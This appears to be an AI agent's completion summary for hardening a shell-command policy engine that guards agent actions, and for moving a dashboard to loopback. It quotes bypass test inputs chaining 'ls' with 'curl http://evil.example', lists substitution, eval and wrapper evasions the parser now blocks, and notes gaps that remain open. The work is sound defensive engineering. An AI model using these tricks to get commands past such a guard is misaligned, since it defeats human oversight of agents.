---
phase: 01-evaluation-hardening-policy-fix
plan: 02
subsystem: policy-engine-security
status: complete
tags: [shell-parsing, parse-differential, fail-closed, command-substitution, redirects, policy-hash, flask, loopback]

requires:
  - phase: none
    provides: existing PolicyEngine, GuardedExecutor and dashboard
provides:
  - "src/policy_engine/shell_split.py: quote-aware parse_shell() returning every simple command the shell would run (separators, grouping, $(), backticks, <(), eval, find -exec, wrappers, redirects); ShellParseError, MAX_DEPTH, MAX_COMMAND_CHARS"
  - "PolicyEngine._check_shell_command checks each sub-command, first BLOCK wins, unparseable input BLOCKed with a 'fail closed' reason"
  - "PolicyEngine.policy_path and policy_sha256 for result stamping (plan 01-03)"
  - "src/dashboard/app.py _run_settings()/main(): 127.0.0.1:5000, debug off, DASHBOARD_HOST/PORT/DEBUG opt-ins"
  - "tests/test_shell_chaining.py (committed red first), tests/test_dashboard_bind.py, TestPolicyHash"
affects: [01-03-runner-resume, 01-04-control-agent-and-viva-notes]

actuals:
  tokens: 7900
  tasks: 3
  commits: 4
plan_head_before: 768ac81776bc8ce197498f16cc8340b0ab2f4172
plan_head_after: 6a22672f8cb8c93b40ba750fb742a555f8402d6c
commits: 4

tech-stack:
  added: []
  patterns:
    - "Parse like the shell before judging: the policy checks the commands the shell will run, not the string it was handed"
    - "Anything unparseable is refused (ShellParseError -> BLOCK, reason contains 'fail closed')"
    - "Nested substitutions are parsed by a child _Parser at depth+1 so the bound and the quoting rules are shared"

key-files:
  created:
    - src/policy_engine/shell_split.py
    - tests/test_shell_chaining.py
    - tests/test_dashboard_bind.py
  modified:
    - src/policy_engine/engine.py
    - tests/test_policy_engine.py
    - src/dashboard/app.py

key-decisions:
  - "Own single-pass lexer instead of shlex.split: shlex cannot report redirections glued to words (echo x>/etc/crontab, 2>&1) or extract $() spans, and the lexer needs per-word 'dynamic' and 'glob' flags to refuse command names built by expansion"
  - "Dynamic redirect targets (echo x > $F) are refused as well as dynamic command names, because the target cannot be checked against the filesystem rules"
  - "Unquoted glob/brace characters in a command name (/usr/bin/cur*) count as dynamic: the default action is FLAG, which still executes"
  - "here-documents and ANSI-C quoting ($'...') are refused outright rather than half-parsed"
  - "Policy hash is taken over the raw bytes on disk; the YAML is parsed from those same bytes"

patterns-established:
  - "Dashboard run settings come from a pure function (_run_settings) so defaults are testable without starting a server"

requirements-completed: [SEC-01, SEC-02]

coverage:
  - id: D1
    description: "ls; curl http://evil.example (and && || | & newline variants) is BLOCKed; GuardedExecutor never passes a blocked chain to its inner executor"
    requirement: "SEC-01"
    verification:
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_separator_chain_is_blocked"
        status: pass
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_guarded_executor_never_runs_blocked_chain"
        status: pass
    human_judgment: false
  - id: D2
    description: "Substitutions, wrappers, grouping, keywords and redirect targets are checked; benign chains stay ALLOWed"
    requirement: "SEC-01"
    verification:
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_substitutions_are_checked"
        status: pass
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_wrappers_and_prefixes_are_unwrapped"
        status: pass
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_redirect_targets_are_checked"
        status: pass
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_benign_chains_stay_allowed"
        status: pass
    human_judgment: false
  - id: D3
    description: "Unparseable input, over-size input, over-deep nesting and dynamic command names fail closed"
    requirement: "SEC-01"
    verification:
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_unparseable_input_fails_closed"
        status: pass
      - kind: unit
        ref: "tests/test_shell_chaining.py#test_dynamic_command_name_is_blocked"
        status: pass
    human_judgment: false
  - id: D4
    description: "PolicyEngine exposes policy_path and policy_sha256 of the loaded YAML"
    requirement: "SEC-01"
    verification:
      - kind: unit
        ref: "tests/test_policy_engine.py#test_policy_hash_matches_file"
        status: pass
    human_judgment: false
  - id: D5
    description: "Dashboard binds 127.0.0.1 with Flask debug off unless DASHBOARD_HOST / DASHBOARD_DEBUG opt in"
    requirement: "SEC-02"
    verification:
      - kind: unit
        ref: "tests/test_dashboard_bind.py#test_defaults_are_loopback_and_debug_off"
        status: pass
      - kind: unit
        ref: "tests/test_dashboard_bind.py#test_main_runs_app_once_with_run_settings"
        status: pass
    human_judgment: false
  - id: D6
    description: "Dashboard reachable from the Windows browser at http://localhost:5000 when the server runs inside WSL and is bound to 127.0.0.1"
    requirement: "SEC-02"
    verification: []
    human_judgment: true
    rationale: "Depends on WSL localhost forwarding on this machine; not exercised here (plan marks it an optional end-of-phase human check)"

duration: ~50 min
completed: 2026-10-20
---

# Phase 1 Plan 02: Shell-chaining bypass and dashboard exposure Summary

**`ls; curl http://evil.example` is now BLOCKed: a quote-aware shell splitter makes the policy engine check every command the shell would run (separators, $(), backticks, <(), eval, find -exec, wrappers, redirect targets), unparseable input fails closed, and the dashboard defaults to 127.0.0.1 with the Werkzeug debugger off.**

## Performance

- **Duration:** about 50 min (start time was not captured by script; estimate)
- **Completed:** 2026-10-20
- **Tasks:** 3 (tracer, auto, auto)
- **Files modified:** 6 (3 created, 3 modified)

## Accomplishments

- SEC-01 bypass reproduced by a committed failing test, then fixed; the whole suite is 204 passed (baseline after 01-01 was 125).
- `parse_shell()` returns every simple command; `_check_shell_command` checks each, first BLOCK wins, with the offending sub-command named in the reason.
- Fail-closed bounds: `MAX_COMMAND_CHARS = 10000`, `MAX_DEPTH = 8`; nesting exactly at the bound still parses (tested).
- `PolicyEngine.policy_path` / `policy_sha256` ready for plan 01-03 to stamp on records.
- SEC-02: `_run_settings()` defaults `{"host": "127.0.0.1", "port": 5000, "debug": False}`; only 1/true/yes/on (any case) enable the debugger.

## Red reproduction evidence

Red commit `72e737f` (`test(01-02): reproduce shell-chaining policy bypass (failing)`) run against the unfixed engine: 12 failed, 4 passed. The failing tests:

- `test_separator_chain_is_blocked[ls; curl http://evil.example]`
- `test_separator_chain_is_blocked[ls && curl http://evil.example]`
- `test_separator_chain_is_blocked[ls || curl http://evil.example]`
- `test_separator_chain_is_blocked[ls | curl http://evil.example]`
- `test_separator_chain_is_blocked[ls & curl http://evil.example]`
- `test_separator_chain_is_blocked[ls\ncurl http://evil.example]`
- `test_guarded_executor_never_runs_blocked_chain[...]` for the same six inputs (the inner executor received the action: `assert 'success' == 'blocked'`)

The four benign-chain tests passed both before and after, as intended.

## Task Commits

1. **Task 1 (tracer): reproduce, then check every separator-joined sub-command** - `72e737f` (test, red), `16ac5c1` (fix, green)
2. **Task 2: substitutions, wrappers, redirects, fail-closed bounds, policy hash** - `bd82acd`
3. **Task 3: dashboard loopback / debug-off defaults** - `6a22672`

Tracer gate: auto mode was not active and the tracer `<verify>` is automated-only, so the verify was re-run end to end (pytest on test_shell_chaining, test_policy_engine, test_agent_loop: all pass) and Task 2 expansion continued.

**policy_sha256 of default_policy.yaml (bytes as on this checkout, read in WSL):** `9dcdaaf1ddf7d008b1fe1d3370ce343110a4680dbf0f8671e14feb643fa95818`. The hash is over on-disk bytes, so a CRLF checkout on Windows would hash differently from the LF file in WSL; record runs from one environment (WSL).

## Files Created/Modified

- `src/policy_engine/shell_split.py` - the splitter and its documented limits
- `src/policy_engine/engine.py` - per-sub-command checking, redirect checks, policy hash; unused `shlex` import removed
- `tests/test_shell_chaining.py` - bypass reproduction and operator, substitution, wrapper, redirect, bound matrices
- `tests/test_policy_engine.py` - `TestPolicyHash` (existing 21 tests untouched)
- `src/dashboard/app.py` - `_run_settings()`, `main()`, docstring Usage
- `tests/test_dashboard_bind.py` - defaults, opt-in values, overrides, `main()` calls `app.run` once with the settings

## Decisions Made

See `key-decisions` above. The notable one: an own lexer replaced `shlex.split` (the plan suggested shlex) because redirections glued to words and `$()` spans cannot be recovered from shlex output.

## Deviations from Plan

### Auto-fixed Issues

**1. [Rule 1 - Bug] At-bound nesting test used an invalid shape**
- **Found during:** Task 2
- **Issue:** My first `test_nesting_at_the_bound_is_still_parsed` nested bare `$($(ls))`, whose command name is itself a substitution, which the dynamic-command-name rule correctly refuses; the test failed for the wrong reason.
- **Fix:** Build the nesting as `echo $(echo $(... ls))` for both the at-bound (parses) and over-bound (fails closed) cases.
- **Files modified:** tests/test_shell_chaining.py
- **Commit:** bd82acd

**2. [Rule 3 - Blocking] Tool-induced backslash mangling while writing test and patch files**
- **Found during:** Tasks 2 and 3
- **Issue:** Backslashes in shell heredocs were collapsed (`\\;` became `\;`, `\\n` became a real newline), which would have produced an invalid escape in the `find -exec ... \;` test and a broken f-string in `app.py` (caught by a SyntaxError at collection).
- **Fix:** Used a raw string for the `\;` case; wrote the SEC-02 patch script with the Write tool and regenerated `app.py` from a saved backup of the working copy.
- **Files modified:** tests/test_shell_chaining.py, src/dashboard/app.py
- **Commit:** bd82acd, 6a22672

**Total deviations:** 2 auto-fixed (1 bug in my own test, 1 blocking tooling issue). **Impact:** none on scope. Extra behavior beyond the plan's lists (all fail-closed or stricter): `time`, `setsid`, `ionice`, `stdbuf` wrappers; here-documents, ANSI-C quoting and `env -S` refused; dynamic redirect targets refused; unquoted glob/brace characters in a command name refused. Extra tests added beyond the prescribed names (`test_benign_redirects_stay_allowed`, `test_wrapped_benign_command_is_still_allowed`, `test_nesting_at_the_bound_is_still_parsed`, `test_parse_errors_are_shell_parse_errors`, debug-value tables).

## Dashboard working-tree handling

The user's uncommitted `src/dashboard/app.py` edits (the `request` import, `RESULTS_DIR`, the `sys.path` insert) were never staged. The SEC-02 commit was built through the index: the same edits were applied to a scratch copy of `HEAD:src/dashboard/app.py`, its blob was put in the index with `git update-index --cacheinfo`, and only that plus `tests/test_dashboard_bind.py` was committed. Afterwards `git diff src/dashboard/app.py` shows exactly the user's three hunks as unstaged, `HEAD:src/dashboard/app.py` has no `RESULTS_DIR`, and the working copy has both the user's edits and `_run_settings()`.

## Issues Encountered

None blocking.

## Known Limits (carried, not stubs)

- Allow-listed interpreters (`python3`, `pip`) can still run arbitrary code; a string policy cannot see inside them. Namespaces and seccomp remain the backstop (threat T-01-08, accepted; for the viva notes in 01-04).
- Wrapper programs the splitter does not know (anything outside its list) fall through to the policy's `default_action`, which is FLAG and FLAG still executes. A stricter default for unknown commands is a policy decision, not made here.
- Pre-existing and unchanged: arguments that are expansions or globs (`cat $F`, `cat /etc/sh*`) are not resolved before the file-argument check.

No stubs, TODOs or skipped tests were introduced, so nothing was appended to `.planning/WINDOWS.md`.

## Threat Flags

None. No new network endpoint or trust boundary beyond the plan's threat model; the dashboard change reduces exposure.

## Next Phase Readiness

Plan 01-03 can stamp `engine.policy_path` / `engine.policy_sha256` on benchmark records, and the protected arm now runs the fixed engine. Ready for 01-03.

## Self-Check: PASSED

- FOUND: src/policy_engine/shell_split.py, tests/test_shell_chaining.py, tests/test_dashboard_bind.py
- FOUND commits: 72e737f, 16ac5c1, bd82acd, 6a22672 (all ancestors of HEAD)
- `git rev-list --count 768ac81..HEAD` = 4 matches `commits: 4` before the SUMMARY commit
- Acceptance greps: `parse_shell(` 2, `fail closed` 1, `def parse_shell` 1, `MAX_DEPTH|MAX_COMMAND_CHARS` 7, `policy_sha256` 1, test functions 14 and 5, `debug=True` 0, `127.0.0.1` 3
- Whole WSL suite: 204 passed, 0 failed
